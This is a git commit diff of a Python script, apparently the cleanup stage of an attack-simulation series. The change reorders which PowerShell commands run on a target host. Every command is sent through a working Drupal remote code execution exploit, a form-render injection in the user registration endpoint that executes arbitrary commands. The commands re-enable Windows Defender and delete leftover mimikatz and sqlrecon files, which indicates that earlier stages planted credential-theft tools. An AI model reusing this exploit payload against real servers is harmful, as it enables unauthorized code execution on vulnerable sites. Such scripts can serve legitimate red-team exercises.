3a373e21ed765987da9c83db35a2515bdb01a6c2
mdiminico <markdiminico@gmail.com>
2019-04-11 16:09:25 -0400

    Update 07-Clean-Up-And-Enable-AV-App-Tier.py

--- 07-Clean-Up-And-Enable-AV-App-Tier.py
+++ 07-Clean-Up-And-Enable-AV-App-Tier.py
@@ -5,15 +5,6 @@ requests.packages.urllib3.disable_warnings()
 
 target = "http://cords.com/"
 
-#Enable Windows Defender
-command = "powershell Set-MpPreference -DisableRealtimeMonitoring $false"
-
-url = target + '/admin/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
-payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': command }
-print("Enabling AV on "+target+" ...")
-r = requests.post(url, data=payload, verify=False)
-print("Complete")
-
 #remove mimikatz files
 command = "powershell Remove-Item -path C:\inetpub\wwwroot\ -Filter *mimikatz*"
 
@@ -31,4 +22,14 @@ payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_ren
 print("Cleaning up sqlrecon files on "+target+" ...")
 r = requests.post(url, data=payload, verify=False)
 print("Complete")
+
+#Enable Windows Defender
+command = "powershell Set-MpPreference -DisableRealtimeMonitoring $false"
+
+url = target + '/admin/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
+payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': command }
+print("Enabling AV on "+target+" ...")
+r = requests.post(url, data=payload, verify=False)
+print("Complete")
+
 
